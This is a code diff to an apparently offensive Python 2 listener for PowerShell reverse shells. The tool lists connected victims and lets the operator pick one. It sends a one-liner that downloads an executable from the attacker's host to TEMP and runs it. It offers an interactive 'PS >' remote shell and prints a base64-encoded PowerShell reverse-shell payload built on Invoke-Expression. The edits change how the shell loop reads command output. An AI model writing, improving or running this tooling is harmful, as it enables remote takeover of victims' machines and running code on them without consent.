@@ -10,6 +10,7 @@ from lib.main import *
 def startSocket(ipaddr, port):
     clientlist = []
     clientnumber = 0
+    targetchoice = ''
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ipaddr, int(port)))
     s.listen(1)
@@ -22,7 +23,6 @@ def startSocket(ipaddr, port):
     while True:
         for client in clientlist:
             print str(client['client']) + ': ' +  client['clientaddress']
-            client['clientinstance'].settimeout(10)
             if client:
                 targetchoice = raw_input('Choose target :>')
         for client in clientlist:
@@ -36,20 +36,17 @@ def startSocket(ipaddr, port):
                         client['clientinstance'].sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\"")
                     elif menu.lower() == "s":
                         while True:
+                            data = ''
                             command = raw_input("PS >")
                             if command == "exit":
                                 break
-                            client['clientinstance'].sendall(command)
-                            data = ''
-                            try:
-                                while True:
-                                    data = client['clientinstance'].recv(1)
-                                    if data == "\00":
-                                        break
-                                    sys.stdout.write(data)
-                                    sys.stdout.flush()
-                            except:
+                            if command == "":
                                 continue
+                            client['clientinstance'].sendall(command)
+                            data = client['clientinstance'].recv(16834)
+                            if data[-1] == "\x00":
+                                sys.stdout.write(data)
+                                sys.stdout.flush()
                     elif menu.lower() == "exit":
                         client['clientinstance'].close()
                         clientlist.remove(client)
@@ -57,6 +54,7 @@ def startSocket(ipaddr, port):
                         break
             else:
                 break
+    s.close()
 
 def runSocket(s, clientlist, clientnumber):
     while True:
@@ -74,7 +72,7 @@ def printListener(ipaddr,port):
         "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
         "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
         "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
-        "$backres = $commandback + ($error[0] | Out-String) + '\00';$error.clear();"
+        "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
     print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
